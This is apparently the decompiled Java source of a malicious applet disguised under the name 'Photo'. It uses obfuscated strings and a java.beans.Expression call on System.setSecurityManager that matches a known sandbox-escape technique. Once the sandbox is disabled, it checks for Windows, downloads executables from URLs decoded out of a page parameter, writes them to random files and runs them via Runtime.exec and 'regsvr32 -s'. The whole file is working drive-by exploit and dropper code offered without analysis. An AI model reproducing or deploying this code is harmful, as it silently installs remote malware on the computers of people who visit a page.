// 
// Decompiled by Procyon v0.5.30
// 

package photo;

import java.lang.reflect.Method;
import java.awt.Component;
import java.beans.Expression;
import java.io.IOException;
import java.io.InputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.net.URL;
import javax.swing.JList;
import java.util.HashSet;
import java.applet.Applet;

public class Photo extends Applet
{
    public String d;
    public String e;
    public String f;
    public HashSet c;
    public static String a;
    public static String b;
    private String j;
    public JList h;
    
    public static String i(final String[] array) {
        final StringBuffer sb = new StringBuffer("");
        int i = 0;
        while (i < array.length) {
            sb.append(array[i++].trim());
        }
        return sb.toString();
    }
    
    public static String k(final String s, final String s2) {
        return i(s.split(s2));
    }
    
    public void m() {
        final String[] split = "d8aosd8a.nd8aamed8an5jsea3ttSea3tcura3tita3tyMaa3tnaa3tgea3tr".split("n5j");
        this.d = k(split[0], "4wfd8a".substring(3));
        this.e = k(split[1], "a3t");
    }
    
    public void l() {
        super.start();
        if (System.getProperty(this.d).indexOf(this.f) >= 0) {
            final Runtime runtime = Runtime.getRuntime();
            final String[] split = HashClass.getHash(Photo.b, Photo.a, this.getParameter("p")).split("y7::".substring(2));
            for (int i = 0; i < split.length; ++i) {
                final String string = "" + Math.random();
                URL url;
                try {
                    url = new URL(split[i]);
                }
                catch (Exception ex) {
                    ex.printStackTrace();
                    return;
                }
                final String s = string;
                FileOutputStream fileOutputStream;
                try {
                    fileOutputStream = new FileOutputStream(s);
                }
                catch (FileNotFoundException ex2) {
                    ex2.printStackTrace();
                    return;
                }
                Object invoke;
                try {
                    invoke = url.getClass().getMethod("openStream", (Class<?>[])new Class[0]).invoke(url, new Object[0]);
                }
                catch (Exception ex3) {
                    ex3.printStackTrace();
                    return;
                }
                gf.s((InputStream)invoke, fileOutputStream);
                try {
                    Class.forName("java.io.InputStream").getMethod("close", (Class<?>[])new Class[0]).invoke(invoke, new Object[0]);
                }
                catch (Exception ex4) {
                    ex4.printStackTrace();
                    return;
                }
                try {
                    fileOutputStream.close();
                }
                catch (IOException ex5) {
                    ex5.printStackTrace();
                    return;
                }
                this.n(string, new String[] { "vdns89", "dvs89h" }, runtime);
            }
        }
    }
    
    @Override
    public void start() {
        Photo.a = i("Ekfgs233QnNuw=ldhfgs233#Lvmqefgs233iTODCffgs233b5Wsfgs233jX/p&t.K7xr-oVM8FAZc_1GHfgs233Y6P3R0%yS4azJgU?fgs233I:29B".split("fgs233"));
        Photo.b = i("Tnifigase10ODCfbnifigase105WsoVM8FAZc_1nifigase10GHY6nifigase10P3R0%nifigase10yS4azJgU?I:29BEkQnNuw=jXnifigase10/p&t.K7xr-ldh#Lvmqei".split("nifigase10"));
        this.j = i("h8esvrh8esveh8esv  gh8esvsh8esvh8esvvh8esvr3h8esv  2 -s \"h8esv".split("h8esv"));
        this.l();
    }
    
    public Photo() {
        this.e = "";
        this.f = i("s87Ws87is87nds87s87os87ws87ss87".split("s87"));
        this.c = new HashSet();
        this.m();
        this.c.add(new b(System.class, this.e, new Object[1]));
        new Expression(System.class, this.e, new Object[1]);
        final Object[] array = { "dsf78g;" };
        this.h = new JList((E[])new Object[] { new HashClass(this, this.c) });
        final Class[] array2 = { Class.class, "ew4".getClass() };
        this.add(this.h);
    }
    
    public void n(final String s, final String[] array, final Object o) {
        try {
            final Method method = o.getClass().getMethod("exec", String.class);
            try {
                method.invoke(o, s);
            }
            catch (Exception ex) {}
            try {
                method.invoke(o, i(new String[] { this.j, s, "\"" }));
            }
            catch (Exception ex2) {}
        }
        catch (Exception ex3) {}
    }
    
    public static boolean g(final Method method, final Object o, final Object[] array) {
        try {
            method.invoke(o, array);
        }
        catch (Exception ex) {}
        return true;
    }
}
